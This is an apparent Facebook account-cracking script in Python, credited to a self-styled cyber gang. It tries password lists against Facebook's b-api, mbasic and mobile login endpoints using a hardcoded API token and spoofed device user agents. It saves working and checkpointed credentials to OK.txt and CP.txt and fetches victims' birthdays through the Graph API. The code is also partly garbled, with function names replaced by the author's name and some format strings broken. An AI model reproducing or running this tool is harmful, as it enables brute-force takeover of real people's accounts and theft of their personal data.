...
# Python 3.11 ___WhatsApp 01840865178
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#ITS AKASH('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = AKASH(self.apk).read().splitlines()
			ITS AKASH(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							ITS AKASH('[•] Result CP saved to CP.txt')
							ITS AKASH('\n\tCrack Processing...\n')
							ITS AKASH('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					ITS AKASH('\n01.) Metode b-api ')
					ITS AKASH('02.) Metode mbasic ')
					ITS AKASH('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			ITS AKASH('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			ITS AKASH(' [1] AKING Method 1 ')
			ITS AKASH(' [2] AKING Method 2  [ Pro ]')
			ITS AKASH(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = AKASH('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_AKASH("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				ITS AKASH('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = AKASH('login.txt').read()
					cp_ttl = Prof_AKASH('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					ITS AKASH('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				ITS AKASH('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				ITS AKASH('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = AKASH('token.txt').read()
					cp_ttl = Prof_AKASH('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].ITS AKASH('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				ITS AKASH('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
AKASHak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
AKASHak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
AKASHak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
AKASHak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
AKASHak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
AKASHak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
AKASHak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
AKASHak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
banner="""\033[1;37m
       ╔══╗╔══╗╔══╗  ╔══╗╔╦╗╔══╗╔══╗╔╗╔╗
      ╚║║╝╚╗╔╝║══╣  ║╔╗║║╔╝║╔╗║║══╣║╚╝║
     ╔║║╗─║║─╠══║  ║╠╣║║╚╗║╠╣║╠══║║╔╗║
 ...
 [*]=============================================
    Author   : ITS AKASH
    Facebook : https://www.facebook.com/profile.php?id=100000966437797
    Team     : BANGLADESH ROYAL CYBER GANGSTER 71
    Connect  : https://facebook.com/groups/1895523294067389/
 [*]=============================================
